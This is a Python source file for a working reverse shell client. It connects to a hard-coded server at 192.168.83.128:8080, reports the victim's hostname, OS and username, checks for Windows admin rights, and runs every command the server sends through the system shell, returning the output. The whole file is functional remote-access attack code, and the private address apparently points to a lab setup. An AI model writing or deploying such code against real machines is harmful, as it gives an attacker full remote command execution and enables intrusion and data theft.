import socket
import os
import subprocess
import ctypes
import platform

def check_admin_access():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return f"Error checking admin status: {e}"

def get_system_info():
    """Gather basic system information for initial connection"""
    info = {
        "OS": platform.system(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Hostname": platform.node(),
        "Username": os.getlogin()
    }
    return info

def connect():
    try:
        # Create socket object and connect to server
        mySocket = socket.socket()
        server_ip = "192.168.83.128"  # Server IP address
        server_port = 8080            # Server port
        
        print(f"[*] Attempting to connect to {server_ip}:{server_port}")
        mySocket.connect((server_ip, server_port))
        
        # Send initial system information
        sys_info = get_system_info()
        init_message = f"Connected to {sys_info['Hostname']} - {sys_info['OS']} {sys_info['Version']} ({sys_info['Username']})"
        mySocket.send(init_message.encode())
        
        # Start shell to process commands
        shell(mySocket)
        
    except ConnectionRefusedError:
        print("[!] Connection refused - Make sure the server is running")
    except Exception as e:
        print(f"[!] Connection error: {str(e)}")

def shell(mySocket):
    while True:
        try:
            # Receive command from server
            command = mySocket.recv(5000).decode()
            
            if not command:
                print("[!] Empty command received, connection may be lost")
                break
            
            # Handle termination command
            if "terminate" in command:
                print("[*] Server has requested termination")
                break
                
            # Handle directory listing (ls/dir command)
            elif command == "dir":
                try:
                    if os.name == 'nt':  # Windows
                        # Use dir /w for more compact output on Windows
                        process = subprocess.Popen(
                            "dir", 
                            shell=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE
                        )
                    else:  # Unix/Linux
                        process = subprocess.Popen(
                            "ls -la", 
                            shell=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE
                        )
                    stdout, stderr = process.communicate()
                    
                    if stdout:
                        mySocket.send(stdout)
                    elif stderr:
                        mySocket.send(stderr)
                    else:
                        mySocket.send("Empty directory".encode())
                except Exception as e:
                    mySocket.send(f"Error listing directory: {str(e)}".encode())
            
            # Handle current directory command (pwd/cd without arguments)
            elif command == "cd":
                try:
                    current_dir = os.getcwd()
                    mySocket.send(f"Current directory: {current_dir}".encode())
                except Exception as e:
                    mySocket.send(f"Error getting current directory: {str(e)}".encode())
            
            # Handle change directory command
            elif command.startswith("cd "):
                try:
                    # Extract the directory path from the command
                    directory = command.split(' ', 1)[1].strip()
                    # Change directory
                    os.chdir(directory)
                    current_dir = os.getcwd()
                    mySocket.send(f"Changed to: {current_dir}".encode())
                except Exception as e:
                    mySocket.send(f"Error changing directory: {str(e)}".encode())
            
            # Handle admin check command
            elif command == "checkUserLevel":
                is_admin = check_admin_access()
                if isinstance(is_admin, bool):
                    result = f"Admin privileges: {'YES' if is_admin else 'NO'}"
                else:
                    result = str(is_admin)  # If it's an error message
                mySocket.send(result.encode())
            
            # Execute any other command
            else:
                try:
                    # Execute the command and capture output
                    process = subprocess.Popen(
                        command, 
                        shell=True, 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE
                    )
                    stdout, stderr = process.communicate(timeout=30)  # Add timeout
                    
                    # Send output or error back to server
                    if stdout:
                        mySocket.send(stdout)
                    elif stderr:
                        mySocket.send(stderr)
                    else:
                        mySocket.send("Command executed with no output".encode())
                except subprocess.TimeoutExpired:
                    process.kill()
                    mySocket.send("Command timed out after 30 seconds".encode())
                except Exception as e:
                    mySocket.send(f"Command execution error: {str(e)}".encode())
        
        except Exception as e:
            print(f"[!] Error in shell: {str(e)}")
            break
    
    # Ensure socket is closed when exiting
    try:
        mySocket.close()
        print("[*] Connection closed")
    except:
        pass

def main():
    connect()

if __name__ == "__main__":
    main()